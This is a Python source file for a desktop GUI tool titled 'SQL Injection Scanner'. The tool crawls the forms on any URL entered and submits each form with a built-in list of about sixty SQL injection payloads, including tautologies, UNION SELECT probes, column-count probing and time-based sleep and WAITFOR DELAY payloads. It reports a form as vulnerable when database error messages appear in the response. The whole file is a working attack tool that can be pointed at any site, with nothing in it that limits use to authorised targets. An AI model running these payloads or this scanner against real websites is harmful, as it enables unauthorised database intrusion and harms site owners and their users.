import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import tkinter as tk
from tkinter import scrolledtext

# Create a session with a user agent
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

# SQL injection payloads
payloads = [
    "'", "''", "`", "``", ",", '"', '""', "//", "\\", "\\\\", ";", "' or \"", "-- or #", "' OR '1", "' OR 1 -- -",
    '" OR "" = "', '" OR 1 = 1 -- -', "' OR '' = '", "'='", "'LIKE'", "'=0--+", " OR 1=1", "' OR 'x'='x", "' AND id IS NULL; --",
    "'''''''''''''UNION SELECT '2", "%00", "/*…*/", "+", "||", "%", "@variable", "@@variable", "AND 1", "AND 0",
    "AND true", "AND false", "1-false", "1-true", "1*56", "-2", "1' ORDER BY 1--+", "1' ORDER BY 2--+",
    "1' ORDER BY 3--+", "1' ORDER BY 1,2--+", "1' ORDER BY 1,2,3--+", "1' GROUP BY 1,2,--+", "1' GROUP BY 1,2,3--+",
    "' GROUP BY columnnames having 1=1 --", "-1' UNION SELECT 1,2,3--+", "' UNION SELECT sum(columnname ) from tablename --",
    "-1 UNION SELECT 1 INTO @,@", "-1 UNION SELECT 1 INTO @,@,@", "1 AND (SELECT * FROM Users) = 1", "' AND MID(VERSION(),1,1) = '5';",
    "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --", ",(select * from (select(sleep(10)))a)",
    "%2c(select%20*%20from%20(select(sleep(10)))a)", "';WAITFOR DELAY '0:0:30'--", "#", "/*", "-- -", ";%00", "`"
]

# Function to get all forms from a URL
def get_forms(url):
    try:
        soup = BeautifulSoup(s.get(url).content, "html.parser")
    except Exception as e:
        result_text.insert(tk.END, f"An error occurred while fetching the URL: {e}\n", "error")
        return []
    return soup.find_all("form")

# Function to extract form details
def form_details(form):
    detailsOfForm = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({
            "type": input_type, 
            "name": input_name,
            "value": input_value,
        })
        
    detailsOfForm['action'] = action
    detailsOfForm['method'] = method
    detailsOfForm['inputs'] = inputs
    return detailsOfForm

# Function to check if a response is vulnerable
def vulnerable(response):
    errors = {
        "quoted string not properly terminated", 
        "unclosed quotation mark after the character string",
        "you have an error in your SQL syntax",
        "warning: mysql",
        "syntax error",
        "unknown column",
        "mysql_fetch_array",
        "mysql_num_rows",
        "pg_query",
        "unterminated quoted string",
        "sql syntax",
        "sql error"
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

# Function to perform SQL injection scan on a URL
def sql_injection_scan(url):
    result_text.insert(tk.END, f"Starting SQL injection scan on {url}\n", "info")
    forms = get_forms(url)
    
    if not forms:
        result_text.insert(tk.END, "No forms found on the page.\n", "info")
        return
    
    for form in forms:
        details = form_details(form)
        target_url = urljoin(url, details["action"])
        result_text.insert(tk.END, f"Testing form with action: {target_url}\n", "info")
        
        for payload in payloads:
            data = {}
            for input_tag in details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    data[input_tag['name']] = input_tag["value"] + payload
                elif input_tag["type"] != "submit":
                    data[input_tag['name']] = f"test{payload}"
    
            try:
                if details["method"] == "post":
                    res = s.post(target_url, data=data)
                else:  # GET method
                    res = s.get(target_url, params=data)
                
                if vulnerable(res):
                    result_text.insert(tk.END, f"SQL injection vulnerability detected in link: {target_url} with payload: {payload}\n", "vulnerable")
                else:
                    result_text.insert(tk.END, f"No SQL injection vulnerability detected in link: {target_url} with payload: {payload}\n", "safe")
            except Exception as e:
                result_text.insert(tk.END, f"An error occurred while testing the form: {e}\n", "error")

# Function to start the scan when the button is pressed
def start_scan():
    url = url_entry.get()
    result_text.delete(1.0, tk.END)
    sql_injection_scan(url)

# Create the main application window
root = tk.Tk()
root.title("SQL Injection Scanner")
root.geometry("700x500")
root.configure(bg="black")

# Create and place the URL entry field and label
url_label = tk.Label(root, text="Enter the URL to be checked:", fg="white", bg="black", font=("Helvetica", 14))
url_label.pack(pady=10)
url_entry = tk.Entry(root, width=50, font=("Helvetica", 14))
url_entry.pack(pady=10)

# Create and place the scan button
scan_button = tk.Button(root, text="Start Scan", command=start_scan, bg="red", fg="white", font=("Helvetica", 14))
scan_button.pack(pady=10)

# Create and place the text area for displaying results
result_text = scrolledtext.ScrolledText(root, width=80, height=20, font=("Helvetica", 12), bg="black", fg="white")
result_text.tag_config("info", foreground="cyan")
result_text.tag_config("vulnerable", foreground="red")
result_text.tag_config("safe", foreground="green")
result_text.tag_config("error", foreground="yellow")
result_text.pack(pady=10)

# Start the GUI event loop
root.mainloop()
